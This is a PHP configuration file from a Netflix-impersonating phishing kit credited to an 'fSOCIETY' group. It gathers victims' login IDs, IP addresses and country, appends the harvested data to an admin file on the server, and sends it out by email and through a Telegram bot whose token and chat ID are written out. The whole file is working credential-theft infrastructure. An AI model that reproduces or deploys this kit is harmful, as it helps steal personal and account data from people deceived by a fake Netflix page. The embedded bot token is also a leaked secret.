<?php
/**
* scama cleaned by METRI it was backdoored @metri_society
###############################################
#$            C0d3d by fS0C13TY_Team         $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 NETFLIX           $#
###############################################

**/
$yourmail  = '';

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['iduserLoginId']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Netflix" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

/**Add Your Api Telegram Token Bellow : **/
$botToken="5190143675:AAHvAfQGvNQCFasroyvVUvOqWF2TUFFwpl0";
$chatId="5260855479";  

$Our_Name = "fSOCIETY🖕🤡🖕" ; 

$Name_page = "💖Netflix By fSOCIETY💖" ;

$JoinUs_On_youtube = "https://www.youtube.com/channel/UCLnz5ZLUsHccLgXVLa5vv9w";

$JoinUs_On_Facebook = "https://www.facebook.com/FsocietyZone/";

$JoinUs_On_telegram = "https://t.me/FUCKTOS0C13TY";



?>